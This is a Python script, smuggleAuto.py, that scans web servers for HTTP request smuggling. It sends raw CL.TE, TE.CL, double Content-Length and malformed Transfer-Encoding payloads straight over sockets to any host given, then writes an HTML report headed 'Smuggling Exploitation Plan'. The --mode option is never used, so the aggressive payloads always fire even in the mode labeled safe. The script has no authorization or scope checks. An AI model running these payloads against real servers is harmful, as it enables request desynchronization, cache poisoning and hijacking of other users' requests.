#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
smuggleAuto.py — enhanced smuggling scanner (SAFE + AGGRESSIVE)
===============================================================
- SAFE: HEAD/GET tests for passive observation
- AGGRESSIVE: raw TE/CL smuggling payloads (CL.TE, TE.CL, double CL, malformed headers)
- Auto-creates: report_SMUGGLE_YYYYMMDD_HHMMSS/report.html
- URIs: use lfi.txt if present; otherwise use an embedded list.
"""

import argparse
import csv
import json
import re
import sys
import time
import socket
import ssl
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote

try:
    import http.client as httpclient
except Exception:
    import httplib as httpclient

SCHEME_DEFAULT = "https"
RPS_DEFAULT = 1.0
TIMEOUT_DEFAULT = 5.0
MAX_URIS_DEFAULT = 300
BODY_BYTES_DEFAULT = 512
URIS_FILE_DEFAULT = "lfi.txt"
EMBEDDED_URIS = ["/", "/admin", "/api/status", "/phpinfo.php"]

@dataclass
class ProbeResult:
    uri: str
    method: str
    status: Optional[int]
    time_ms: Optional[int]
    server: Optional[str]
    resp_headers: Dict[str,str]
    body_snippet: Optional[str]
    error: Optional[str]

# === SAFE PROBE ===
def safe_probe_only(host: str, scheme: str, uris: List[str], rps: float, timeout: float, max_count: int, body_bytes: int) -> List[ProbeResult]:
    results: List[ProbeResult] = []
    delay = 1.0 / max(0.1, rps)
    port = 443 if scheme == "https" else 80
    for path in uris[:max_count]:
        time.sleep(delay)
        try:
            conn = httpclient.HTTPSConnection(host, port, timeout=timeout, context=ssl.create_default_context()) if scheme == "https" else httpclient.HTTPConnection(host, port, timeout=timeout)
            start = time.time()
            conn.request("HEAD", path, headers={"User-Agent": "smuggleAuto-safe", "Accept": "*/*", "Connection": "close"})
            res = conn.getresponse()
            dt = int((time.time() - start) * 1000)
            results.append(ProbeResult(path, "HEAD", res.status, dt, res.getheader("Server"), dict(res.getheaders()), None, None))
            conn.close()
        except Exception as e:
            results.append(ProbeResult(path, "HEAD", None, None, None, {}, None, str(e)))
    return results

# === AGGRESSIVE PROBE ===
def aggressive_probe(host: str, scheme: str, uris: List[str], timeout: float) -> List[ProbeResult]:
    results = []
    port = 443 if scheme == "https" else 80
    for path in uris[:10]:
        payloads = [
            ("CL.TE", f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"),
            ("TE.CL", f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nX"),
            ("Double-CL", f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nContent-Length: 10\r\n\r\nTest"),
            ("Malformed-TE", f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: cow\r\nContent-Length: 4\r\n\r\nTest"),
        ]
        for label, raw in payloads:
            try:
                s = socket.create_connection((host, port), timeout=timeout)
                if scheme == "https":
                    context = ssl.create_default_context()
                    s = context.wrap_socket(s, server_hostname=host)
                start = time.time()
                s.sendall(raw.encode())
                resp = s.recv(1024)
                dt = int((time.time() - start) * 1000)
                status = int(resp.split(b" ")[1]) if b"HTTP/" in resp else 0
                results.append(ProbeResult(path, label, status, dt, None, {}, resp.decode(errors='ignore'), None))
                s.close()
            except Exception as e:
                results.append(ProbeResult(path, label, None, None, None, {}, None, str(e)))
    return results

# === COMBINED PROBE ===
def probe_safe_and_aggressive(host: str, scheme: str, uris: List[str], rps: float, timeout: float, max_count: int, body_bytes: int) -> List[ProbeResult]:
    safe = safe_probe_only(host, scheme, uris, rps, timeout, max_count, body_bytes)
    aggressive = aggressive_probe(host, scheme, uris, timeout)
    return safe + aggressive

# === URI LOADING ===
def read_uris(limit: int = MAX_URIS_DEFAULT) -> List[str]:
    p = Path(URIS_FILE_DEFAULT)
    if p.exists():
        lines = p.read_text(encoding='utf-8', errors='ignore').splitlines()
        return [x.strip() if x.startswith('/') else '/' + x.strip() for x in lines if x.strip() and not x.startswith('#')][:limit]
    return EMBEDDED_URIS[:limit]

# === HTML REPORT ===
def render_html_report(host: str, scheme: str, results: List[ProbeResult], out_html: Path, generated_at: str):
    good = [r for r in results if r.status and 200 <= r.status < 300]
    bad = [r for r in results if not r.status or r.status >= 300]
    def fmt_row(r: ProbeResult) -> str:
        return f"<tr><td>{r.method}</td><td>{r.uri}</td><td>{r.status or ''}</td><td>{r.time_ms or ''}</td><td><pre>{r.body_snippet or r.error or ''}</pre></td></tr>"
    html = f"""<html><head><title>smuggleAuto Report</title></head><body>
    <h1>smuggleAuto Report — {host}</h1>
    <p>Generated at: {generated_at}</p>
    <h2>Good Responses (2xx)</h2>
    <table border=1><tr><th>Method</th><th>URI</th><th>Status</th><th>Time (ms)</th><th>Body/Error</th></tr>
    {''.join(fmt_row(r) for r in good)}</table>
    <h2>Bad/Interesting Responses</h2>
    <table border=1><tr><th>Method</th><th>URI</th><th>Status</th><th>Time (ms)</th><th>Body/Error</th></tr>
    {''.join(fmt_row(r) for r in bad)}</table>
    <h2>Smuggling Exploitation Plan</h2>
    <ul>
    <li><b>CL.TE:</b> Backend may parse TE, proxy may use CL → split request</li>
    <li><b>TE.CL:</b> Proxy parses TE, backend uses CL → smuggled prefix</li>
    <li><b>Double-CL:</b> Ambiguity in length header can lead to desync</li>
    <li><b>Malformed-TE:</b> Unexpected Transfer-Encoding values may bypass filters</li>
    </ul>
    </body></html>"""
    out_html.write_text(html, encoding="utf-8")

# === MAIN ===
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=["safe-probe","auto"], required=True)
    ap.add_argument("--host", required=True)
    ap.add_argument("--scheme", choices=["http","https"], default=SCHEME_DEFAULT)
    ap.add_argument("--generate-poc", action="store_true", help="Output final report path for automation")
    args = ap.parse_args()

    ts = time.strftime("%Y%m%d_%H%M%S")
    outdir = Path(f"report_SMUGGLE_{ts}")
    outdir.mkdir(parents=True, exist_ok=True)
    uris = read_uris()
    results = probe_safe_and_aggressive(args.host, args.scheme, uris, RPS_DEFAULT, TIMEOUT_DEFAULT, MAX_URIS_DEFAULT, BODY_BYTES_DEFAULT)
    out_html = outdir / "report.html"
    render_html_report(args.host, args.scheme, results, out_html, time.strftime("%Y-%m-%d %H:%M:%S"))

    if args.generate_poc:
        print(f"[+] Report written to {out_html.resolve()}")
    else:
        print("[i] Scan complete. Use --generate-poc for automation-friendly output.")

if __name__ == "__main__":
    main()
